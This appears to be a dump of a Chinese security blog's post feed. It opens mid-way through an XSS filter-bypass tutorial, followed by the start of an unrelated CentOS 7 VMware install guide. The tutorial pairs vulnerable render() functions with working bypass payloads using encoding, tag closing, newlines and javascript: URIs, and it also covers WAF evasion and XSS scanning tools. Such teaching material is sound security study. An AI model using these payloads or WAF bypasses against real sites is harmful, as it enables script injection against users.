class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line"> let domainRe = /^https?:\/\/www\.segmentfault\.com/ <span class="comment">//http...或https....</span></span><br><span class="line"> <span class="keyword">if</span> (domainRe.<span class="title function_ invoke__">test</span>(input)) &#123;  <span class="comment">//是否包含在input中</span></span><br><span class="line"> <span class="keyword">return</span> `&lt;script src=<span class="string">&quot;$&#123;input&#125;&quot;</span>&gt;&lt;/script&gt;`</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>http://www.segmentfault.com&quot; onload=&quot;alert(1)</code></p><h2 id="4、编码脚本绕过关键字过滤"><a href="#4、编码脚本绕过关键字过滤" class="headerlink" title="4、编码脚本绕过关键字过滤"></a>4、编码脚本绕过关键字过滤</h2><h3 id="（1）Javascript-的编码-–eval-函数"><a href="#（1）Javascript-的编码-–eval-函数" class="headerlink" title="（1）Javascript 的编码 –eval() 函数"></a>（1）Javascript 的编码 –eval() 函数</h3><p><code>\uXXXX</code> 这种写法的 Unicode 转义序列，表示一个字符，其中 XXXX 表示一个 16 进制数字，如 &lt; 的 Unicode 编码为 \ u003c。</p><p>有的时候，服务器往往会对代码中的关键字（如 alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句 eval() 来实现。eval() 会将编码过的语句解码后再执行，简直太贴心了。</p><p>例如 alert(1) 编码过后就是<code>\u0061\u006c\u0065\u0072\u0074(1)</code>（对应于 ASCII 码的十六进制）</p><p>所以构建出来的攻击语句如下：<code>&lt;script&gt;eval(\u0061\u006c\u0065\u0072\u0074(1))&lt;/script&gt;</code></p><h3 id="（2）HTML-实体编码"><a href="#（2）HTML-实体编码" class="headerlink" title="（2）HTML 实体编码"></a>（2）HTML 实体编码</h3><p>实体编码字符<code>&lt;svg&gt;</code>（翻译官）</p><p>把要转码的先 Unicode 转换一下，然后后台看到有翻译官会把 Unincode 编码转回为当初的字符</p><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> const stripBracketsRe = /[()`]/g    //正则表达式，看//包裹的内容即可</span><br><span class="line"> input = input.replace(stripBracketsRe, &#x27;&#x27;)  把()`替换为空</span><br><span class="line"> return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 因为控制字符 () 变成了实体编码因此要使用翻译官才能让 () 正确发挥控制字符的作用</p><h3 id="（3）翻译官（Unicode-编码）"><a href="#（3）翻译官（Unicode-编码）" class="headerlink" title="（3）翻译官（Unicode 编码）"></a>（3）翻译官（Unicode 编码）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.toUpperCase()  //把所有的输出内容都大写</span><br><span class="line"> return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;</code> 👈HTML 编码或者<code>&lt;svg&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;</code>👈Unicode 编码</p><h2 id="5、主动闭合标签实现注入代码"><a href="#5、主动闭合标签实现注入代码" class="headerlink" title="5、主动闭合标签实现注入代码"></a>5、主动闭合标签实现注入代码</h2><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> return &#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27; + input + &#x27;&quot;&gt;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input type=&#39;name&#39; value=&quot;</code> 或者 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="6、绕过小括号"><a href="#6、绕过小括号" class="headerlink" title="6、绕过小括号 ()"></a>6、绕过小括号 ()</h2><p>在前端中，反引号 &#96; 可以当作小括号来使用</p><p>比如以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> <span class="variable constant_">stripBracketsRe</span> = /[()]/g   <span class="comment">//正则表达式，看//中间的内容即可</span></span><br><span class="line"> input = input.<span class="title function_ invoke__">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)  <span class="comment">//把[()]替换为空</span></span><br><span class="line"> <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&lt;script&gt;alert`1`&lt;/script&gt;</code></p><h2 id="7、绕过-96"><a href="#7、绕过-96" class="headerlink" title="7、绕过 ()&#96;"></a>7、绕过 ()&#96;</h2><h3 id="1-使用-HTML-实体编码"><a href="#1-使用-HTML-实体编码" class="headerlink" title="(1) 使用 HTML 实体编码"></a>(1) 使用 HTML 实体编码</h3><p>如上文所述</p><h2 id="8、绕过-HTML-注释符"><a href="#8、绕过-HTML-注释符" class="headerlink" title="8、绕过 HTML 注释符"></a>8、绕过 HTML 注释符</h2><p>有两种注释方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 注释内容 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 注释内容 --!&gt;</span><br></pre></td></tr></table></figure><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/--&gt;/g, &#x27;😂&#x27;)  //将--&gt;替换为笑脸</span><br><span class="line"> return &#x27;&lt;!-- &#x27; + input + &#x27; --&gt;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：使用另一个注释符来畸形进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure><h2 id="9、利用换行符绕过"><a href="#9、利用换行符绕过" class="headerlink" title="9、利用换行符绕过"></a>9、利用换行符绕过</h2><p>%0a– 换行符</p><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/auto|on.*=|&gt;/ig, &#x27;_&#x27;) //auto或on开头，后面跟任意东西，直到出现=或者&gt;都转化成_</span><br><span class="line"> return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>在前端的世界里，换行一样有用，因此这里通过换行来避免 on 碰到 &#x3D;</p><h2 id="10、绕过右标签"><a href="#10、绕过右标签" class="headerlink" title="10、绕过右标签"></a>10、绕过右标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line"></span><br><span class="line"> input = input.replace(stripTagsRe, &#x27;&#x27;) //所有标签类的，只让写左标签，右标签一加，就替换为空</span><br><span class="line"> return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配 &lt;&#x2F; 任意字符&gt;，而且 &#x2F; i 过滤了大小写，但 html 的单标签也可以解析</p><p>payload：<code>&lt;img src=x onerror=&quot;alert(1)&quot;</code></p><h2 id="11、绕过-lt-x2F-内容-gt"><a href="#11、绕过-lt-x2F-内容-gt" class="headerlink" title="11、绕过 &lt;&#x2F; 内容&gt;"></a>11、绕过 &lt;&#x2F; 内容&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line"> src = src.replace(/&lt;\/style&gt;/ig, &#x27;/* \u574F\u4EBA */&#x27;) //碰到&lt;/style&gt;就替换成/*坏人*/</span><br><span class="line"> return `</span><br><span class="line"> &lt;style&gt;</span><br><span class="line"> $&#123;src&#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line"> `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（1）使用换行"><a href="#（1）使用换行" class="headerlink" title="（1）使用换行"></a>（1）使用换行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br></pre></td></tr></table></figure><h3 id="（2）使用空格"><a href="#（2）使用空格" class="headerlink" title="（2）使用空格"></a>（2）使用空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;</span><br></pre></td></tr></table></figure><h2 id="12、引用指定网站下的目录文件"><a href="#12、引用指定网站下的目录文件" class="headerlink" title="12、引用指定网站下的目录文件"></a>12、引用指定网站下的目录文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.toUpperCase()  //把所有的输出内容都大写</span><br><span class="line"> return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>js 标签，src 的地址，随便，但是 js 的语法是大小写敏感的</p><p>开启 phpstudy，在目录下创建一个<code>ABC.JS</code>，写上一条<code>alert(1);</code>语句，保存</p><p>payload：<code>&lt;script src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt;</code></p><h2 id="13、使用-JS-的注释符"><a href="#13、使用-JS-的注释符" class="headerlink" title="13、使用 JS 的注释符"></a>13、使用 JS 的注释符</h2><h3 id="（1）注释符-–-gt"><a href="#（1）注释符-–-gt" class="headerlink" title="（1）注释符 –&gt;"></a>（1）注释符 –&gt;</h3><p><code>--&gt;</code> js 的注释符，让后面的语句不生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/[&lt;/&quot;&#x27;]/g, &#x27;&#x27;) //过滤了&lt; / &quot; &#x27;</span><br><span class="line"> return `</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> // alert(&#x27;$&#123;input&#125;&#x27;)    注释只能注释掉这一行</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line"> `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xx</span><br><span class="line">alert(1)</span><br><span class="line">--&gt;     js的注释符，让后面的语句不生效</span><br></pre></td></tr></table></figure><h3 id="（2）注释符-x2F-x2F"><a href="#（2）注释符-x2F-x2F" class="headerlink" title="（2）注释符 &#x2F;&#x2F;"></a>（2）注释符 &#x2F;&#x2F;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function render (s) &#123;</span><br><span class="line">  function escapeJs (s) &#123;</span><br><span class="line">    return String(s)</span><br><span class="line">            .replace(/\\/g, &#x27;\\\\&#x27;)</span><br><span class="line">            .replace(/&#x27;/g, &#x27;\\\&#x27;&#x27;)</span><br><span class="line">            .replace(/&quot;/g, &#x27;\\&quot;&#x27;)</span><br><span class="line">            .replace(/`/g, &#x27;\\`&#x27;)</span><br><span class="line">            .replace(/&lt;/g, &#x27;\\74&#x27;)</span><br><span class="line">            .replace(/&gt;/g, &#x27;\\76&#x27;)</span><br><span class="line">            .replace(/\//g, &#x27;\\/&#x27;)</span><br><span class="line">            .replace(/\n/g, &#x27;\\n&#x27;)</span><br><span class="line">            .replace(/\r/g, &#x27;\\r&#x27;)</span><br><span class="line">            .replace(/\t/g, &#x27;\\t&#x27;)</span><br><span class="line">            .replace(/\f/g, &#x27;\\f&#x27;)</span><br><span class="line">            .replace(/\v/g, &#x27;\\v&#x27;)</span><br><span class="line">            // .replace(/\b/g, &#x27;\\b&#x27;)</span><br><span class="line">            .replace(/\0/g, &#x27;\\0&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  return `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var url = &#x27;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#x27;</span><br><span class="line">  var a = document.createElement(&#x27;a&#x27;)</span><br><span class="line">  a.href = url</span><br><span class="line">  document.body.appendChild(a)</span><br><span class="line">  a.click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&quot;);alert(1)//</code></p><p>通过源码发现一些字符被转义了，就连换行符也被转义了。但是发现竟然还可以用，原因是 &#x2F;&#x2F; 虽然被转义成了 &#x2F;&#x2F;，但转义之后还是 &#x2F;&#x2F;，在 js 中还是注释符（勿与正则混淆）</p><h2 id="14、使用古英语"><a href="#14、使用古英语" class="headerlink" title="14、使用古英语"></a>14、使用古英语</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/&lt;([a-zA-Z])/g, &#x27;&lt;_$1&#x27;) &lt;碰到字母就变成&lt;_</span><br><span class="line"> input = input.toUpperCase()</span><br><span class="line"> return &#x27;&lt;h1&gt;&#x27; + input + &#x27;&lt;/h1&gt;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用维基百科搜索 s，会发现长 s，古英语的 s</p><p>举一反三，碰到其他字母是否也可以用古英语</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=&#x27;http://127.0.0.1/ABC.JS&#x27;&gt;&lt;/script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h2 id="15、使用伪协议"><a href="#15、使用伪协议" class="headerlink" title="15、使用伪协议"></a>15、使用伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="三、Waf-防护与绕过演示"><a href="#三、Waf-防护与绕过演示" class="headerlink" title="三、Waf 防护与绕过演示"></a>三、Waf 防护与绕过演示</h1><p>就使用 xss-labs 这个靶场的第一关和某狗作为演示</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-e6aaf8a07400e9b2.png"></p><p>分析拦截情况</p><ol><li>通过去除关键词或关键词的其中某些字母判断拦截了什么关键词，如下正常</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-18b631079fa7d76f.png"></p><ol start="2"><li>而如下就不正常了</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-634df3384095219c.png"></p><ol start="3"><li>如下正常。说明是匹配了<code>&lt;script&gt;</code>标签</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-4b37395ce934618c.png"></p><ol start="4"><li>尝试大小写绕过不行后，利用 XSS 平台，发现后面<code>&lt;/h2&gt;</code>的<code>&gt;</code>把前面的给包起来了，导致访问的链接拼接了<code>&lt;/h2</code></li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-25e75e6055c19d3f.png"></p><ol start="5"><li>使用引号包裹链接即可</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-17e1069bfd8d0ddb.png"></p><ol start="6"><li>使用超链接也可以，但是<code>&lt;a href=xxx&gt;</code>猜测也就会检测 href，而事实也确实如此，只需要在 href 前加 &#x2F; 即可绕过，也不影响语义，而之所以加 &#x2F; 能绕过，是因为在前端中 &#x2F; 经常出现在 </xxxx> 闭合的后标签，加上后就会让 waf 误以为是结束标签</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-9fb013bb29342ccd.png"></p><h1 id="四、常规-Waf-绕过思路"><a href="#四、常规-Waf-绕过思路" class="headerlink" title="四、常规 Waf 绕过思路"></a>四、常规 Waf 绕过思路</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] 标签语法替换</span><br><span class="line">[+] 特殊符号干扰    比如 / #</span><br><span class="line">[+] 提交方式更改    Request的前提下，Waf只检查URL内容而不检查POST内容</span><br><span class="line">[+] 垃圾数据溢出    </span><br><span class="line">[+] 加密解密算法</span><br><span class="line">[+] 结合其他漏洞绕过</span><br></pre></td></tr></table></figure><h1 id="五、XSS-自动化工具"><a href="#五、XSS-自动化工具" class="headerlink" title="五、XSS 自动化工具"></a>五、XSS 自动化工具</h1><h2 id="1、Xwaf"><a href="#1、Xwaf" class="headerlink" title="1、Xwaf"></a>1、Xwaf</h2><p>下载链接：<a href="https://links.jianshu.com/go?to=https://github.com/3xp10it/xwaf">https://github.com/3xp10it/xwaf</a></p><p>现在作者貌似不再维护该项目了</p><h2 id="2、XSStrike"><a href="#2、XSStrike" class="headerlink" title="2、XSStrike"></a>2、XSStrike</h2><p>下载链接：<a href="https://links.jianshu.com/go?to=https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">XSStrike 主要特点：</span><br><span class="line">[+] 反射和 DOM XSS 扫描</span><br><span class="line">[+] 多线程爬虫</span><br><span class="line">[+] Context 分析</span><br><span class="line">[+] 可配置的核心</span><br><span class="line">[+] 检测和规避 WAF</span><br><span class="line">[+] 老旧的 JS 库扫描</span><br><span class="line">[+] 智能 payload 生成器</span><br><span class="line">[+] 手工制作的 HTML &amp; JavaScript 解析器</span><br><span class="line">[+] 强大的 fuzzing 引擎</span><br><span class="line">[+] 盲打 XSS 支持</span><br><span class="line">[+] 高效的工作流</span><br><span class="line">[+] 完整的 HTTP 支持</span><br><span class="line">[+] Bruteforce payloads 支持</span><br><span class="line">[+] Payload 编码</span><br></pre></td></tr></table></figure><p>相关参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure><h1 id="六、Fuzzing-测试"><a href="#六、Fuzzing-测试" class="headerlink" title="六、Fuzzing 测试"></a>六、Fuzzing 测试</h1><ul><li><p>在线生成 Fuzzing 字典：<a href="https://links.jianshu.com/go?to=https://xssfuzzer.com/fuzzer.html">XSS Fuzzer</a></p></li><li><p>Fuzzing 字典：<a href="https://links.jianshu.com/go?to=https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p></li></ul><h1 id="七、XSS（带过滤）靶场实战"><a href="#七、XSS（带过滤）靶场实战" class="headerlink" title="七、XSS（带过滤）靶场实战"></a>七、XSS（带过滤）靶场实战</h1><ul><li><p>Xss-labs：<a href="https://links.jianshu.com/go?to=https://www.yuque.com/docs/share/ad406668-69f3-4ac4-bde4-ec2ef0f2ae9f?%23">https://www.yuque.com/docs/share/ad406668-69f3-4ac4-bde4-ec2ef0f2ae9f?#</a></p></li><li><p>Xss 靶场通关：<a href="https://links.jianshu.com/go?to=https://www.yuque.com/docs/share/e0fb2c24-dbef-4174-8d44-eb6f4a164246?%23">https://www.yuque.com/docs/share/e0fb2c24-dbef-4174-8d44-eb6f4a164246?#</a></p></li><li><p>Java Xss 测试平台：<a href="https://links.jianshu.com/go?to=https://gitee.com/yhtmxl/imxss/">https://gitee.com/yhtmxl/imxss/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7 超详细安装教程</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/Centos7%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/Centos7%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>原文：<a href="https://www.jianshu.com/p/ce08cdbc4ddb?utm_source=tuicool&utm_medium=referral">https://www.jianshu.com/p/ce08cdbc4ddb?utm_source&#x3D;tuicool&amp;utm_medium&#x3D;referral</a></p><p>本篇文章主要介绍了 <a href="https://so.csdn.net/so/search?q=VMware&spm=1001.2101.3001.7020">VMware</a> 安装 Centos7 超详细过程（图文），具有一定的参考价值，感兴趣的小伙伴们可以参考一下</p><p><strong>1. 软硬件准备</strong></p><p>软件：推荐使用 VMwear，我用的是 VMwear 12</p><p>镜像：<a href="https://so.csdn.net/so/search?q=CentOS7&spm=1001.2101.3001.7020">CentOS7</a> , 如果没有镜像可以在官网下载 ：<a href="http://isoredirect.centos.org/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-1804.iso">http://isoredirect.centos.org/centos/7/isos/x86_64&#x2F;CentOS-7-x86_64-DVD-1804.iso</a></p><p>这里也放上百度云盘下载地址：</p><p>链接：<a href="https://pan.baidu.com/s/12oBtfjqTe0BAsXacZ4LEag">https://pan.baidu.com/s/12oBtfjqTe0BAsXacZ4LEag</a> <br>提取码：ex9a    </p><p><img src="https://img-blog.csdn.net/20180711223703824?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>硬件：因为是在宿主机上运行虚拟化软件安装 centos，所以对宿主机的配置有一定的要求。最起码 I5CPU 双核、硬盘 500G、内存 4G 以上。</p><p><img src="https://img-blog.csdn.net/20180711223715242?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>2. 虚拟机准备</strong></p><ol><li>打开 VMwear 选择新建虚拟机</li></ol><p><img src="https://img-blog.csdn.net/20180711223726365?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="2"><li>典型安装与自定义安装</li></ol><p>典型安装：VMwear 会将主流的配置应用在虚拟机的操作系统上，对于新手来很友好。</p><p>自定义安装：自定义安装可以针对性的把一些资源加强，把不需要的资源移除。避免资源的浪费。</p><p>这里我选择自定义安装。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8afab7ddde63e03b8205d02505e266d7.png"><img src="https://img-blog.csdn.net/20180711223827626?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="3"><li>虚拟机兼容性选择</li></ol><p>这里要注意兼容性，如果是 VMwear12 创建的虚拟机复制到 VM11、10 或者更低的版本会出现一不兼容的现象。如果是用 VMwear10 创建的虚拟机在 VMwear12 中打开则不会出现兼容性问题。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/103c72662d151f9f63c1c43ad14c6622.png"><img src="https://img-blog.csdn.net/20180711223841653?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="4"><li>选择稍后安装操作系统</li></ol><p><img src="https://img-blog.csdnimg.cn/img_convert/31a97c101935deb5734490b44c4aae71.png"><img src="https://img-blog.csdn.net/20180711223854551?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="5"><li>操作系统的选择</li></ol><p>这里选择之后安装的操作系统，正确的选择会让 vm tools 更好的兼容。这里选择 linux 下的 CentOS</p><p><img src="https://img-blog.csdn.net/20180711223907671?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="6"><li>虚拟机位置与命名</li></ol><p>虚拟机名称就是一个名字，在虚拟机多的时候方便自己找到。</p><p>VMwear 的默认位置是在 C 盘下，我这里改成 F 盘。</p><p><img 